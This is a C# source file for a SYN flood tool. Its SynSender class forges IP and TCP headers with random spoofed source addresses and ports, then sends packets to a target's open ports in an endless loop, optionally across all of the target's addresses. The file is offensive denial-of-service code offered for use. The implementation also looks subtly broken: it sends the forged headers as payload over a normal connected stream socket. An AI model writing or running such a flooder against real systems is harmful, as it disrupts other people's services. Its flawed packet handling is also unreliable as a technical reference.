using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

namespace SynFlood;

public static class SynSender
{
    private static int globalPacketId = 1;
    private static readonly int ipHeaderSize = Unsafe.SizeOf<IpHeader>();
    private static readonly int tcpHeaderSize = Unsafe.SizeOf<TcpHeader>();

    public static void Send(string targetIp, List<short> targetOpenPorts, bool attackAllInterface = false)
    {
        var synAttack = true;
        var ipAddresses = IpUtils.GetTargetIpAddresses(targetIp, attackAllInterface);

        foreach (var address in ipAddresses)
        {
            var (sourceIp, sourcePort, targetPort) = IpUtils.GetRandomAndIpPortData(targetOpenPorts);

            var ipHeader = IpHeaderBuilder.Forge(address.ToString(), sourceIp);
            var tcpHeader = TcpHeaderBuilder.Forge(targetPort, sourcePort);
            var bytes = PackageBuilder.ConvertToByteArray(ref ipHeader, ref tcpHeader);

            long packetId = 1;
            do
            {
                (sourceIp, sourcePort, targetPort) = IpUtils.GetRandomAndIpPortData(targetOpenPorts);

                var endPoint = new IPEndPoint(address, targetPort);
                using var socket = new Socket(endPoint.AddressFamily, SocketType.Stream, ProtocolType.IP);
                socket.Connect(endPoint);

                ipHeader.id = IPAddress.HostToNetworkOrder(packetId);
                ipHeader.saddr= IpHeaderBuilder.IpAddressToUInt(sourceIp);
                tcpHeader.source = IPAddress.HostToNetworkOrder(sourcePort);

                var span = new Span<byte>(bytes);
                var ipHeaderSpan = span[..ipHeaderSize];
                MemoryMarshal.Write(ipHeaderSpan, in ipHeader);
                var tcpHeaderSpan = span.Slice(ipHeaderSize, tcpHeaderSize);
                MemoryMarshal.Write(tcpHeaderSpan, in tcpHeader);

                socket.Send(bytes, SocketFlags.None);
                Console.WriteLine($"{globalPacketId++}. {sourceIp}:{sourcePort} -> {targetIp}:{targetPort}");
                packetId++;
            }
            while (synAttack);
        }
    }
}
